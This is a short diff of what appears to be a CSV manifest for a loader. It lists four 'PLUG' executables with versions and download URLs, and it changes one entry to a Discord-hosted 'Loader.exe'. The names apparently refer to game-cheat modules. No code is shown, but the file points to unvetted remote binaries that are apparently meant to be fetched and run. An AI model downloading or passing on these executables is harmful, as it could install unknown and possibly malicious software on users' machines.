@@ -1,4 +1,4 @@
-PLUG LEGIT,online,1.00.01,https://raw.githubusercontent.com/Adev47/TEST_ML/main/uploads/plug_legit.exe
+PLUG LEGIT,online,1.00.02,https://cdn.discordapp.com/attachments/1243673490536530001/1258692255149981756/Loader.exe?ex=6688f802&is=6687a682&hm=25a41199ca9bfa567add527fab76c5037eb03d35233bdda1edc0d0a36cb11fc6&
 PLUG RAGE,online,1.00.01,https://raw.githubusercontent.com/Adev47/TEST_ML/main/uploads/Plug_Rage.exe
 PLUG SILENT,online,1.00.01,https://raw.githubusercontent.com/Adev47/TEST_ML/main/uploads/plug_o2Heb5Au1.exe
 PLUG UA,online,1.00.01,https://raw.githubusercontent.com/Adev47/TEST_ML/main/uploads/Plug_UA.exe
